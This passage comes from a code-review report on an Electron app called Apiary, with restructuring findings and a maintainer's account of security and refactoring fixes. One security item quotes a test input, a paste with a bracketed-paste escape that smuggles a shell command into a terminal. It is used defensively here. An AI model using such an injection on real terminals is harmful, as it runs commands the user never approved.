- **Gain:** A smaller security-boundary file, and clearer names.
- **Implementation steps:** Move the code verbatim, then fix the imports (3 importers of `shared/promptPath`).
- **Verification:** `npm test` (`themeValidate`, `themeGlass`, `promptPath` tests) and typecheck.
- **Constraints:** Keep "validateTheme is the only way in". `ensureReadable` stays unexported from the barrel.
- **Depends on:** SHARED-1.

#### STRUCT-1: Move test-only fake binaries from scripts/fixtures to tests/fixtures/bin

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `scripts/fixtures/fake-glab.sh` is used only by `tests/e2e/pluginBar.spec.ts:14` and `helpers.ts:155`.
  - `fake-glab-api.sh` is used only by `tests/e2e/mrStatus.spec.ts:6`.
  - `fake-code.sh` is used only by `tests/e2e/openInVsCode.spec.ts:6` and `helpers.ts:158`.
  - `fake-claude.sh` is used only by the README screenshot (`scripts/screenshot.spec.ts:53`; its
    header says "used only by `npm run screenshot`").
  - Test fixtures are therefore split across two trees (`tests/fixtures/` and `scripts/fixtures/`).
- **What:**
  - `git mv` the three test fakes to `tests/fixtures/bin/`.
  - Move `screenshot.spec.ts` and `fake-claude.sh` to `scripts/screenshot/`.
  - Update the paths.
- **Why:** Ownership. Deleting "scripts" should never break e2e.
- **Gain:** All test inputs live under `tests/`.
- **Implementation steps:**
  1. Update the three spec constants and the two `helpers.ts` comments.
  2. Update `playwright.screenshot.config.ts` (`testDir: './scripts/screenshot'`).
  3. Change `tsconfig.eslint.json:5` and `eslint.config.js:137` to `scripts/**/*.spec.ts`.
  4. Update README 144-145.
  5. `lint:sh` picks up the moved files automatically (`git ls-files '*.sh'`).
- **Verification:**
  - `npm run lint` passes.
  - `npm run test:e2e -- tests/e2e/pluginBar.spec.ts tests/e2e/mrStatus.spec.ts tests/e2e/openInVsCode.spec.ts` passes.
  - `npm run screenshot` still runs. The maintainer should run both.
- **Constraints:** Keep the executable bits: `git mv` preserves the mode.
- **Depends on:** none.

#### STRUCT-2: Group the flat top level of src/main into feature folders

**Lead review:** Superseded by the reconciled tree in §3.2. That tree adopts MAIN-13, MAIN-14 and MAIN-15's service folders plus this finding's `windows/` and `claude/` groupings. Keep `src/main/index.ts` in place.

- **Severity:** medium
- **Effort:** M
- **Evidence:** `src/main` has 15 top-level files next to 13 folders. Several of them form an
  unnamed "windows" subsystem: `windowAtPoint`, `windowBounds`, `sessionLayoutStore`,
  `sessionLayoutRestore`, `layoutFlushCoordinator`, `tabRegistry`, and `navigationGuard`.
  Another group forms an unnamed "claude" subsystem: `claudeRename`, `claudeSessionTracker`, and `live/`.
  `appService.ts` (1103 lines), `ipc.ts` (697) and `index.ts` (597) are the composition root.
- **What:** Use the directory layout in §4: `app/`, `windows/` and `claude/`, with the existing
  subfolders unchanged. The main-process reviewer owns what goes inside `appService` and `ipc`; this
  is only the directory move.
- **Why:** Feature ownership. It also gives the nested `CLAUDE.md` files (DOC-1) natural homes, for
  example `windows/CLAUDE.md` for the window and tab rules.
- **Gain:** You can see from the tree what exists. Each nested doc loads exactly for its subsystem.
- **Implementation steps:**
  1. `git mv` per group.
  2. Fix the imports.
  3. Update `electron.vite.config.ts:21` if `index.ts` moves. **Recommendation: keep
     `src/main/index.ts` in place** as the entry point, to avoid touching the build config and
     `package.json` `main`.
  4. Update the CLAUDE.md paths (DOC-11 catches any you miss).
- **Verification:** typecheck, lint, `npm test`, and one `npm run test:e2e:smoke`.
- **Constraints:** Don't name a folder `renderer` (ESLint `**/renderer/**` pattern). Keep
  `search/searchWorker.ts`, because it is the second build entry.
- **Depends on:** Coordinate with the main-process reviewer.

#### STRUCT-3: Group renderer components by feature, and put hooks in one place

**Lead review:** Superseded by UI-31, which has the file-by-file mapping.

- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - `src/renderer/components/` holds 43 flat files, including non-components. The hooks
    `useHoverCard.ts` and `useMrStatuses.ts` are there, and `pluginBar.tsx` exports only
    `usePluginBar` and `pluginButtons` (lines 31 and 58), with no component.
  - Other hooks live in `state/` (`useActiveTabs`, `useTree`, `useDebouncedValue`, …).
  - `state/notifications.tsx` is JSX in a state folder.
  - camelCase `.tsx` files sit among PascalCase components: `icons.tsx` (21 icon components),
    `mrRefText.tsx` (exports `MrRefText`), and `pluginBar.tsx`.
- **What:** `components/{sidebar,session,terminal,layout,transcript,git,settings,dialogs,common}/`,
  plus `renderer/hooks/` for every `use*` module, and PascalCase for every file whose main export is
  a component (`MrRefText.tsx`, `Icons.tsx`, or `icons/`). The renderer reviewer owns the detailed
  mapping.
- **Why:** Naming consistency, and finding things.
- **Gain:** Predictable locations. It also matches the component and e2e test file names, which
  are already feature-named.
- **Implementation steps:** Same move-and-codemod procedure as STRUCT-2. Keep `App.tsx`, `main.tsx`,
  `styles.css` and `index.html` at the renderer root (`electron.vite.config.ts:45` points at `index.html`).
- **Verification:** typecheck, lint and `npm run test:component`.
- **Constraints:** Never create `components/main/` (the ESLint trap).
- **Depends on:** Coordinate with the renderer reviewer.

#### STRUCT-4: Align test file naming and import style with the modules under test

- **Severity:** low
- **Effort:** S-M
- **Evidence:**
  - Most unit tests are named after their module. The exceptions:
    - `localFilter.test.ts` tests `shared/treeFilter` + `fuzzy`
    - `describeCheck.test.ts` tests `renderer/state/updateSummary`
    - `installInstructions.test.ts` tests `main/update/capability`
    - `tabTransfer.test.ts` tests `shared/types`
    - `updateVersions.test.ts` tests `update/versions` + `capability` + `installerAsset`
    - `logRotation.test.ts` tests `log/rotation`
    - `searchLoad.test.ts` and `themeGlass.test.ts` are scenario-named
    - `smoke.test.ts` asserts `package.json` fields
  - Shared imports in tests are mixed: 42 relative (`../../src/shared/…`) versus 9 `@shared/…`
    alias. In `src` it is 85 alias versus 0 relative.
  - 10 unit tests import renderer modules (`allWorktrees`, `branchSelection`, `columns`,
    `describeCheck`, `describeError`, `groups`, `layout`, `recentSessions`, `refreshSummary`,
    `terminalPaste`). This is fine, because those modules are pure. But CLAUDE.md:410-413 reads as if
    it forbids this.
- **What:**
  - Convention: a unit test is named after the module it tests (`<module>.test.ts`). Scenario tests
    go to `integration/`, or get a `<module>.<scenario>.test.ts` name.
  - Use `@shared/…` everywhere.
  - Clarify in `tests/CLAUDE.md` that pure `renderer/state` modules may be unit-tested in Node, and
    anything touching the DOM goes to component tests.
  - Optionally mirror the src tree: `tests/unit/{main,shared,renderer}/…`. Vitest's glob is
    recursive, so this needs no config change.
- **Why:** Finding the test for a module should take one glob.
- **Gain:** Predictability.
- **Implementation steps:** Rename 6-8 files with `git mv`, then run a sed codemod to switch the imports to the alias.
- **Verification:** `npm test` shows the same test count before and after.
- **Constraints:** Keep the component and e2e feature names paired (`sidebar.test.tsx` ↔ `sidebar.spec.ts`).
- **Depends on:** none.

#### STRUCT-5: Tidy .gitignore and the ESLint ignore list

- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `.gitignore` (10 lines) lacks `coverage/`, which ESLint ignores at `eslint.config.js:25`.
  - `.superpowers/` is ignored only through a nested `.superpowers/sdd/.gitignore` containing `*`.
    `git check-ignore` shows `.gitignore` has no rule for it. A new sibling folder such as
    `.superpowers/other/` would show up as untracked.
  - There are no editor or local-agent entries (`.vscode/`, `.idea/`, `.claude/settings.local.json`).
  - `git status --porcelain --ignored` is clean apart from `.agent-reports/`, `.husky/_/`,
    `.superpowers/`, `out/` and `test-results/`. No junk is tracked.
  - `eslint.config.js:25` `globalIgnores` duplicates `.gitignore` by hand.
- **What:** Add `coverage/`, `.superpowers/`, `.claude/settings.local.json` and `.vscode/` (or
  `.vscode/*` with `!.vscode/extensions.json`). Use `includeIgnoreFile` from `@eslint/compat` so the
  ESLint ignores follow `.gitignore`.
- **Why:** Consistency, and so a future local artefact is not committed by accident.
- **Gain:** One source of truth for ignores.
- **Implementation steps:** Edit the two files, then run `npm run lint`.
- **Verification:** `git check-ignore -v coverage/x .superpowers/x` shows rules from `.gitignore`.
- **Constraints:** Keep `.worktrees/` ignored.
- **Depends on:** none.

---

### 6. Verified OK / keep as is

- **CLAUDE.md content quality.** Almost every technical claim checks out (§1: 55 of 63 rows OK). The
  "why" prose is valuable and specific. Keep the voice.
- **The ABI table and the "never run concurrently" rule.** Accurate (`package.json`), and it is the
  most important operational warning. Keep it in root.
- **IPC channels.** All 100 `CHANNELS` keys are used by both `preload/index.ts` and `src/main`. No
  dead channels were found (scripted grep).
- **The shared ↔ main/renderer boundary.** ESLint enforces it (`eslint.config.js:111-119`), and
  `src/shared` imports nothing from either side. The only relative parent imports are
  `theme/effects/*` → `../color` and `../spec`.
- **`src/shared` modules are small, pure and single-purpose.** This holds for `activity.ts` (87
  lines, named constants `RUNNING_WINDOW_MS`, `TAIL_LINES` and patterns documented from
  recordings), `redact.ts` (named `MAX_STRING`, narrow secret patterns), `fuzzy.ts`, `mrRefs.ts`,
  `gitMessages.ts` and `forkLabel.ts`. Each has a unit test (`activity`, `redact`, `localFilter`,
  `mrRefs`, `gitMessages`, `forkLabel`, `promptPath`, `sessionRank`, `layoutReport`, `tabTransfer`).
- **`theme/` design.** The allowlists drive the validator, the CSS vars and the generator's JSON
  schema (`prompt.ts:45`), so they cannot drift. Effects are pure and deterministic
  (`effects/types.ts` hash) and run against the `Ctx2D` shim in Node. The `EFFECTS` registry is
  exhaustive through its `Record<Exclude<…>>` type.
- **Top-level configs.** Each tool's config at the root is conventional and correct.
  `playwright.screenshot.config.ts` is deliberately separate, and its comment explains why.
  `tsconfig.eslint.json` exists only to type-lint root configs, as documented.
- **Test layers and naming.** Component and e2e files are feature-named and paired. The `@serial`
  and `@smoke` tagging is documented in `playwright.config.ts:3-16`.
- **Hooks and CI.** `.husky` and `ci.yml` do what they say. Tests are kept out of hooks for a
  documented reason.
- **CHANGELOG.md.** Keep-a-Changelog with SemVer. The version gaps (no 1.6.x or 1.7.0; 1.21.0
  folded into 1.22.1) are intentional. Line 126 explains 1.22.0, and git history shows the other
  numbers were never used.
- **docs/install-prompt.md.** A paste-only file, excluded from markdownlint on purpose. Keep the path.
- **`.gitignore` coverage of build output** (`out/`, `dist/`, `release/`, `test-results/`,
  `playwright-report/`). Nothing unwanted is tracked.
- **Nothing in `docs/superpowers` is loaded by any tool or referenced by code.** It is safe to move or index.

---

### 7. Suggested order of work

1. **DOC-2**: fix the stale sentences and comments (S; it survives any restructure).
2. **DOC-3, DOC-5, DOC-6**: commands, DoD, versioning and env vars (S each). They go straight into
   today's CLAUDE.md top, so there is immediate value even before the restructure.
3. **SHARED-5** (lint purity), **SHARED-4** (exhaustive notes), **SHARED-6** (dead export),
   **STRUCT-5** (ignores). All small, independent guard-rail wins.
4. **DOC-1**: the restructure, done as verbatim moves first and edits second, with **DOC-4**
   recipes and **DOC-7** feature map written into the new root.
5. **DOC-11**: the doc-reference check, pointed at the final file set.
6. **DOC-8** (history index) and **DOC-9** (CONTRIBUTING, LICENSE, README trim, .nvmrc).
7. **SHARED-1, then SHARED-2, then SHARED-3**: split shared by domain, make types single-source,
   then name the protocol strings. Use barrels during the transition, and coordinate with the main
   and renderer reviewers.
8. **SHARED-7, SHARED-8**: validator de-duplication and tests, and theme factoring.
9. **STRUCT-1** (fixtures), then **STRUCT-2 and STRUCT-3** (main and renderer folders, with the
   other reviewers), then **STRUCT-4** (test naming). Update the DOC-7 map and the nested CLAUDE.md
   paths in the same commits. DOC-11 will fail the build if they are forgotten.
10. **DOC-10** (ADRs): opportunistically, as each topic doc is touched.

Each step is its own commit, with a version bump and changelog entry per the maintainer's rule. No
push or tag without asking.

## 7. Maintainer reply (1.26.0)

All 115 findings below were actioned on `chore/review-2026-09-26` by a sequence of work-package
agents (A through O2, see `.agent-reports/review/`), merged and verified on a quiet machine:
typecheck and lint clean; unit + integration 1141/1141; component 250/250; build ok; full e2e 143
passed, 12 skipped (opt-in live/bench specs), 0 failed; `npm audit` 0 vulnerabilities (was 28). Docs
were verified the same way as code: `npm run lint` now includes `scripts/check-doc-refs.mjs`
(DOC-11), which fails the build if a documented path stops existing, so every path cited below was
checked against the tree, not assumed.

Where a finding's fix landed in stages across several work packages, the bullet below describes the
combined, final outcome, not any one package's partial view.

### Summary

| Status | Count |
| --- | --- |
| Fixed | 85 |
| Partly done | 27 |
| Deferred | 1 |
| Rejected | 2 |
| **Total** | **115** |

### Part A: Security

- **SEC-1 — Fixed.** Electron 38.8.6 → 44.4.5, electron-builder → 26.15.3, `@electron/rebuild` → 4,
  `better-sqlite3` → 13, `node-pty` → 1.1, plus `dompurify`/Playwright patches; the npm `shellcheck`
  package (an unfixed `decompress` zip-slip in its chain) is replaced by `scripts/lint-sh.mjs`
  against a system shellcheck. `npm run audit` (`npm audit --audit-level=low`, dev included) is now
  a gate in `ci.yml` and `release.yml` ahead of build/test. Proven by `npm audit` (0 vulnerabilities,
  was 28) and the full e2e/build suite.
- **SEC-2 — Fixed.** `src/renderer/features/transcript/MarkdownText.tsx` sanitises with an explicit
  `ALLOWED_TAGS`/`ALLOWED_ATTR`/`ALLOWED_URI_REGEXP` allowlist and strips any non-checkbox `input`
  or non-http(s)/mailto `href`; `navigationGuard.decideNavigation` now requires an exact URL match
  (ignoring the hash), and CSP adds `form-action 'none'; base-uri 'none'; object-src 'none';
  frame-src 'none'`. Proven by `tests/unit/navigationGuard.test.ts` and a `tests/component/
  transcript.test.tsx` case rendering a hostile message (`<style>`, `<form>`, a `popover`, a
  `?restore=` link) and asserting none of it survives.
- **SEC-3 — Fixed.** `readTestEnv()`/`parseRuntimeEnv` (`src/main/app/env.ts`) makes every
  `APIARY_*` hook and `ELECTRON_RENDERER_URL` `undefined` once `app.isPackaged`. Electron fuses
  (`runAsNode`, `enableNodeOptionsEnvironmentVariable`, `enableNodeCliInspectArguments` off;
  `enableCookieEncryption`, `onlyLoadAppFromAsar`, `enableEmbeddedAsarIntegrityValidation` on, with
  `resetAdHocDarwinSignature: true` so the ad-hoc-signed build stays launchable) are set in
  `electron-builder.yml`. Verified with `codesign --verify --deep --strict` passing and the packaged
  app launching and quitting cleanly.
- **SEC-4 — Fixed.** `.github/workflows/release.yml`: top-level `permissions: contents: read`; only
  the `publish` job (which does no checkout, install or build) has `contents: write`; every `uses:`
  in `ci.yml`/`release.yml` is pinned by commit SHA.
- **SEC-5 — Partly done.** `setQuarantine()` in `src/main/update/electronUpdaterBackend.ts` sets
  `com.apple.quarantine` on a verified download so Gatekeeper still evaluates it. Signing
  `latest-mac.yml`/`latest-linux.yml` with an offline Ed25519 key is deferred: it needs a key pair
  generated and kept off CI, which is release infrastructure the maintainer doesn't have set up yet.
  Proven by new cases in `tests/unit/electronUpdaterBackend.test.ts`.
- **SEC-6 — Fixed.** `stripPasteControls()` (`src/shared/pasteSafe.ts`) replaces every ESC in pasted
  text with a visible placeholder before it is wrapped for a prompt or handed to xterm's `paste`.
  Proven by `tests/unit/pasteSafe.test.ts` and an integration test confirming a paste containing
  `ESC[201~\r!echo pwned` produces exactly one closing marker.
- **SEC-7 — Fixed.** `downloadInstaller` takes only `basename(decodeURIComponent(...))` and throws on
  a path-traversal-looking name; it downloads into a private `mkdtemp` directory with an exclusive
  create, and `openInstaller` re-hashes the file immediately before opening it. The macOS mount
  helper now uses a `mktemp -d` mountpoint instead of the fixed `/Volumes/Apiary`. Proven by new
  cases in `tests/unit/electronUpdaterBackend.test.ts` and `tests/unit/installInstructions.test.ts`.
- **SEC-8 — Fixed.** `readTranscriptPage` rejects a non-safe-integer `beforeIndex`; `PtyManager.resize`
  clamps cols/rows; `reportLayout` stamps the sender's own window number instead of trusting the
  message; `importSessions` requires each auto-import path to already be a known project; several
  settings fields are now clamped/filtered. The remaining structural piece — a sender-frame check on
  every `handle`/`on` — landed standalone and is now built into `src/main/ipc/registrar.ts`'s
  `isTrustedSender` check for every channel. Proven by `tests/unit/transcriptReader.test.ts`,
  `tests/integration/ptyManager.test.ts`, `tests/unit/reportLayoutGuard.test.ts`, and
  `tests/unit/ipcContract.test.ts`.
- **SEC-9 — Fixed.** `checkout`, `checkout -b --track`, `checkout --detach` and `merge` now pass
  `--end-of-options` and a trailing `--`, in `src/main/git/branchOps.ts`. Proven by two new cases in
  `tests/unit/branchOps.test.ts` (an `--orphan=x` "ref" creates no orphan branch; checking out a ref
  named the same as a locally-modified file leaves the edit intact).
- **SEC-10 — Fixed.** `installPermissionGuards()` (`src/main/permissions.ts`) allows only
  `clipboard-read`/`clipboard-sanitized-write` from the app's own page and denies HID/serial/USB via
  `setDevicePermissionHandler`. Proven by `tests/unit/permissions.test.ts`.
- **SEC-11 — Fixed.** `shared/redact.ts` gained rules for `scheme://user:password@host`, AWS/Slack/
  npm tokens and PEM key blocks, and `Logger.log` now redacts `scope`/`msg` too and spreads redacted
  fields before the fixed keys so a field can't masquerade as the message. Proven by
  `tests/unit/redact.test.ts` (including the exact `fatal: unable to access
  'https://bob:hunter2@gitlab.example/...'` example) and two cases in `tests/integration/logger.test.ts`.
- **SEC-12 — Partly done.** `readSearchText`/`indexTranscript` stop collecting once
  `MAX_TEXT_PER_SESSION` is reached and skip any line over 1MB before parsing it; `readTranscriptPage`
  skips an oversized line the same way. The widening byte range `readTranscriptPage` reads per
  iteration is still unbounded in bytes for a file that is mostly non-message lines — judged a lower-
  severity, rarer case not worth the regression risk to the existing pagination arithmetic. Proven by
  `tests/unit/indexer.test.ts` and new cases in `tests/unit/transcriptReader.test.ts`.
- **SEC-13 — Deferred.** The finding's own note says this only matters once Apiary has a Developer ID
  and is signed ("parked in Phase 8"); Apiary ships unsigned today, so removing the two broad macOS
  entitlements would have no effect and no way to verify. Left for whoever sets up signing.

### Part B: Main process, preload and IPC

- **MAIN-1 — Fixed.** `AppService.refresh({ paths })` re-reads only the transcripts a watcher event
  named and re-resolves only their cwds, instead of a full library rescan; `refresh()`/`{ full:
  true }` keeps the old full-rescan path. Measured on a 240-file/20-repo fixture: a cold full pass
  parses 240/240; an unchanged full pass re-parses 0/240; a one-file scoped pass costs 1 file, 1
  folder, 0 git spawns. `tests/integration/appService.test.ts`, `tests/unit/sessionScanner.test.ts`.
- **MAIN-2 — Fixed.** `SessionStore.syncAll(entries)` wraps a whole refresh pass in one `db.transaction`,
  one fsync per pass instead of two per project. A new test proves a mid-pass failure leaves no
  partial rows from either the failing or the already-committed batch.
- **MAIN-3 — Fixed.** `resolveProject` now needs 2 git spawns per uncached folder instead of 3
  (`--git-common-dir`/`--show-toplevel` in one call, `symbolic-ref -q --short HEAD` for the branch,
  which also handles an unborn branch). New tests cover a repository with no commits and a detached
  HEAD.
- **MAIN-4 — Fixed.** `AppService.refreshProject(cwd)`/`refreshProjectByKey` re-resolve one folder
  and sync just its project row; `afterGitMutation(key, isPtyId, branchMayChange)` in
  `src/main/ipc/handlers/git.ts` replaces the 8 pasted "refresh-then-broadcast" blocks — a checkout
  re-resolves the one folder, a pull/fetch/merge only broadcasts `treeChanged`. Proven by
  `tests/integration/appService.test.ts` asserting no full refresh runs for a branch-only mutation.
- **MAIN-5 — Fixed.** Confirmed no production caller of `PtyManager.replay()`/the replay buffer via
  `grep`, then removed it along with the 3 tests that only asserted its existence.
- **MAIN-6 — Fixed.** `PtyManager`'s `onExit` now disposes the headless screen and clears its
  bookkeeping on a self-exit, not just an explicit close — previously leaking one headless
  `Terminal` per session whose process ever exited on its own. A new test spawns a process that
  exits by itself and asserts `screen(id) === ''` afterwards; confirmed it fails without the fix.
- **MAIN-7 — Fixed.** `SearchIndex.replaceNotes(entries)` does the whole notes resync in one
  transaction, removing the window where a concurrent note search could see an empty table. New
  cases in `searchIndex.test.ts`.
- **MAIN-8 — Fixed.** `AppService` tracks the running index pass as a promise (`indexPass`);
  `rebuildSearchIndex()` awaits it, then always runs a fresh pass. New integration test reproduces
  the old bug (confirmed failing before the fix) and proves every session is indexed after a
  mid-pass rebuild.
- **MAIN-9 — Fixed.** `branchOps.status()` costs 2 git spawns in every case (was up to 4), via
  `symbolic-ref` plus one `for-each-ref` call for upstream/ahead/behind; "not a repository" now
  resolves to `null` instead of rejecting on every 5-second poll. The per-cwd single-flight/memo the
  finding also suggests was not added — no measured need beyond the spawn-count fix, and CLAUDE.md's
  "measure before fixing" rule argues against adding caching machinery speculatively.
- **MAIN-10 — Fixed.** `tree()` memoises `cwdExists` per distinct path (`src/main/util/memoize.ts`);
  `sessionNote(id)` uses an indexed store lookup instead of a linear scan; `persistBounds` is
  debounced 300ms and cleared on window close.
- **MAIN-11 — Fixed.** `src/shared/ipc/{guards,contract.ts}` is one declarative map of all 99
  channels (kind, wire string, argument guard, result type); `CHANNELS` and the renderer's
  `ApiaryApi` are derived from it, `src/preload/index.ts` is a ~35-line loop over it (was ~125
  hand-written lines), and `src/main/ipc/registrar.ts` type-checks every handler against it. Channel
  strings and argument order are byte-identical (verified by a snapshot test). Proven by
  `tests/unit/ipcContract.test.ts` and `tests/integration/ipcWiring.test.ts`.
- **MAIN-12 — Partly done.** `src/main/windows/broadcast.ts`'s `broadcast(channel, ...args)` replaced
  the six hand-rolled `BrowserWindow.getAllWindows()` loops; a menu-triggered rescan now updates
  every window, not just the focused one (`tests/e2e/multiWindow.spec.ts`). The remaining step —
  a shared `rescan(reason)` that also invalidates MR statuses on the menu path, so "rescan" means one
  thing everywhere — was not extracted; the menu path still calls a slightly different sequence than
  the periodic timer.
- **MAIN-13 — Fixed.** `src/main/ipc.ts` (718 lines) and `themeIpc.ts` are gone, replaced by
  `ipc/registrar.ts`, `ipc/index.ts` (`registerIpc(deps: IpcDeps)`, one deps object instead of 11
  positional parameters) and `ipc/handlers/{sessions,terminals,git,settings,tabs,plugins,update,log,
  theme}.ts`. The chokidar watcher, activity-coalescing timer and cross-window tab-move logic were
  further extracted into unit-tested classes: `sessions/sessionWatcher.ts`, `terminals/
  activityBroadcaster.ts`, `windows/tabMover.ts`. Proven by `tests/unit/{sessionWatcher,
  activityBroadcaster,tabMover}.test.ts` and the full e2e suite for the affected paths (`detachTab`,
  `multiWindow`, `activeSection`, `newSession`).
- **MAIN-14 — Partly done.** `appService.ts` is down from 1,295 to 847 lines (35%): `sessions/
  sessionResolver.ts`, `git/gitService.ts`, `media/imageStore.ts`, `vscode/vscodeService.ts`,
  `search/searchService.ts` and `terminals/terminalService.ts` now each own a cohesive slice, each
  independently unit- or integration-tested, with the 1,200+-line `appService.test.ts` staying green
  and unmodified throughout. Splitting the remaining refresh/session-management surface into
  `SessionCatalog`/`SessionActions` is deferred: it's built around the `refresh()` reentrancy state
  machine and the `live` map, which carry the most documented history of subtle races in this
  codebase (see the block comment above `refresh()`), and three separate agents judged it unsafe to
  split without a dedicated pass.
- **MAIN-15 — Partly done.** `main/app/env.ts` (`parseRuntimeEnv`) centralises every test/launch
  override; `update/createUpdater.ts`, `windows/windowManager.ts` and `app/lifecycle.ts`
  (`installQuitDeferral`) are pure moves out of `index.ts`, each newly unit-tested
  (`tests/unit/{createUpdater,lifecycle}.test.ts`) or verified against the window-heavy e2e specs.
  `index.ts` is down to 372 lines from ~658. The explicit composition root (`createContainer`) is
  deferred: it depends on MAIN-14's remaining services existing first.
- **MAIN-16 — Fixed.** Atomic writes (`src/main/fs/atomicWrite.ts`, tmp+rename) cover
  `settings.json` and `session-layout.json`. `src/main/settings/settingsService.ts` is now the one
  owner of settings in the main process (`get`/`patch`/`applyPayload`/`onChange`), replacing ~10
  scattered `loadSettings`/`saveSettings` call sites. Proven by `tests/unit/settingsService.test.ts`
  and `tests/unit/{settings,sessionLayoutStore}.test.ts` (a write that fails partway leaves the
  previous valid file untouched).
- **MAIN-17 — Partly done.** `src/main/plugins/builtin.ts`'s `BUILTIN_PLUGINS` list plus a
  `defaultEnabled` the plugin declares itself removed the hardcoded `'gitlab-mr'` id from
  registration; `PluginRegistry.lookup()` now stamps `pluginId` itself so an item can't disagree with
  its plugin; the cache evicts idle folder+branch entries after 10 minutes instead of growing
  forever; a `dispose()` hook was added. A generic `PluginContext.remoteUrl()` and a
  `pluginRefStatus` channel replacing `gitlabMrRefStatus` are deferred — no second plugin exists yet
  to justify the wider seam. Proven by 4 new cases in `tests/integration/pluginBar.test.ts`.
- **MAIN-18 — Fixed.** `src/main/sources/claudeProjects.ts`'s `ClaudeProjectsSource` (a
  `SessionSource` interface: `scan`/`watch`/`transcriptPathFor`) replaces three modules
  independently rebuilding `~/.claude/projects` paths. Proven by
  `tests/unit/claudeProjectsSource.test.ts`.
- **MAIN-19 — Fixed.** `fireAndForget()` (`src/main/log/fireAndForget.ts`) covers the watcher's
  rescan and window `loadURL`/`loadFile`; `app.whenReady()` is wrapped in try/catch with a dialog and
  `app.quit()` on failure; `process.on('unhandledRejection'|'uncaughtException')` are now logged; the
  VS Code spawn has an `error` listener. Every `ipcMain.on` listener and theme channel now goes
  through the registrar's wrapper (guarded, logged) — closing item 4. Proven by
  `tests/unit/fireAndForget.test.ts`, `tests/unit/detectVsCode.test.ts`, and
  `tests/unit/ipcContract.test.ts`'s malformed-`reportTabs` case; a stale comment claiming the
  `uncaughtException` listener leaves crash behaviour unchanged was corrected in review.
- **MAIN-20 — Fixed.** `shutdown()` now cancels an in-progress theme generation, stops the updater,
  stops the Claude session tracker, removes the cross-window focus listener, and closes the
  content-search worker before `disposeIpc`. The finding's suggested refactor of `onData`/`onExit`/
  `onChange` into returned unsubscribe functions was not done — no behaviour depends on it. Proven by
  a new `tests/e2e/themeGenerator.spec.ts` case: quitting mid-generation leaves the spawned process
  dead, confirmed by pid.
- **MAIN-21 — Partly done.** `src/shared/domain/ptyId.ts` (`newPendingPtyId`, `isPendingPtyId`,
  `shellPtyId`, `parseShellPtyId`) replaced every ad hoc mint/parse site on both sides, byte-identical
  ids, tested in `tests/unit/ptyId.test.ts`. The larger step — branded `SessionId`/`PtyId` types and
  collapsing the 17 `(key, isPtyId)` parameter pairs into one `TerminalRef` — depended on MAIN-11,
  which has since landed, but nobody has returned to do the type-branding pass; left as real,
  unblocked follow-up work.
- **MAIN-22 — Fixed.** Six main/shared mirror pairs (`UpdateStatus`/`UpdatePhase`/`Capability`/
  `InstallInstructions`/`OpenInstallerResult`, `PluginBarItem` and friends, `MrState`, `OpenTab`,
  `LogLevel`/`LogStatus`, `THEME_MODELS`/`ThemeModel`) are now defined once in `shared/domain/*`,
  with main importing them; `AppSettings extends AppSettingsPayload` instead of repeating 20 fields.
  Verified with the review's own greps (`grep -n "Mirrors" src/shared/api.ts` → 0 hits).
- **MAIN-23 — Fixed.** `src/main/exec/run.ts`'s `createExec` is now shared by `gitlabMr.ts`,
  `mrStatusCache.ts`, `branchOps.ts`, `worktreeResolver.ts`, `liveSessionDetector.ts` and
  `detectVsCode.ts` (6 of 7), each keeping its own throw-vs-null contract. `update/macSignature.ts`
  deliberately keeps its own synchronous `execFileSync` — a one-time, synchronous, pre-window
  capability check that a deliberately-async wrapper wouldn't simplify. Proven by
  `tests/unit/execRun.test.ts` and per-module wrapper-seam tests.
- **MAIN-24 — Fixed.** `indexTranscript` has an append-only fast path (only new bytes read when a
  transcript grows cleanly); the offsets cache is now an LRU of 50 transcripts instead of unbounded.
  Measured on a ~20MB/40,001-message fixture: 25ms cold full scan vs. 2ms incremental re-index after
  one appended message (~12x). Proven by `tests/unit/transcriptReader.test.ts` and
  `tests/integration/searchIndex.test.ts`.
- **MAIN-25 — Fixed.** The watcher's depth narrowed from 2 to 1 with an `ignored` filter admitting
  only `.jsonl` files, and its changed-paths feed MAIN-1's scoped refresh instead of triggering a
  full rescan.
- **MAIN-26 — Partly done.** `src/main/terminals/ptyDataCoalescer.ts` buffers pty chunks per id and
  flushes on `setImmediate`, preserving arrival order; measured 500 chunks → 1 broadcast instead of
  500. Sending `ptyData` only to windows with that pty attached (step 2) is deferred — the finding
  gates it on measurement after step 1, and step 1 already collapsed the dominant cost.

### Part C: Renderer

- **UI-1 — Partly done.** App's props to `Sidebar`/`SessionColumn` are now stable across unrelated
  re-renders — `pinnedKeys`, `pendingTabInfo`, `transferFor` and the ~15 inline per-column handlers
  are `useMemo`/`useCallback`'d instead of rebuilt every render (`src/renderer/App.tsx`), proven by
  `tests/component/appPropStability.test.tsx` reading React's own `memoizedProps` off the fiber tree.
  `state/useUiState.ts` and `state/useAppSettings.ts` were also extracted. Wiring the UI-2 reducer
  into App via a provider, moving the pending/reconcile/rekey effects into hooks, and a `DialogHost`
  are deferred: three separate agents judged this too risky to do piecemeal — it's the exact
  machinery (rekey ordering, "never spawn over a live id") that has shipped broken twice before, and
  the review's own plan calls for one change per hook with full e2e after each.
- **UI-2 — Partly done.** `src/renderer/features/workspace/workspaceReducer.ts` is a pure reducer
  covering every case the six bookkeeping `useState`s handle, with 24 passing unit tests
  (`tests/unit/workspaceReducer.test.ts`). It is not yet wired into `App.tsx` — that swap is UI-1's
  deferred remainder, for the same reason.
- **UI-3 — Partly done.** `state/treeStore.ts` shares one in-flight `tree()` fetch across every
  caller in the same tick, replacing 4 independent per-effect fetches in `App.tsx`. A real regression
  surfaced during e2e verification (a stale cached tree could freeze a later session out of its tab)
  and was fixed by making `current()` never reuse a completed fetch from an earlier tick — proven by
  `tests/e2e/sessionFollowing.spec.ts` and a regression test, `treeStoreDedup.test.tsx`. Sidebar's own
  separate `useSessionTreeCache` is kept as-is by design; `key={treeNonce}` still forces a full
  Sidebar remount on import, left as a documented, minor partial.
- **UI-4 — Partly done.** `useActiveTabs` now keeps referential identity when nothing relevant
  changed; `MessageRow` and `TerminalView` are `memo()`'d with targeted comparators. Memoising
  `SessionRow`/`Sidebar`/`SessionColumn` is deferred with UI-1: their props from App are still
  rebuilt fresh every render, so wrapping them in `React.memo` now would be a no-op per CLAUDE.md's
  "measure before fixing" rule. Proven by `tests/unit/useActiveTabs.test.ts`,
  `tests/component/{messageRowMemo,terminalViewMemo}.test.tsx`.
- **UI-5 — Fixed.** `NotificationsApi`'s frequently-changing `items` is split into its own
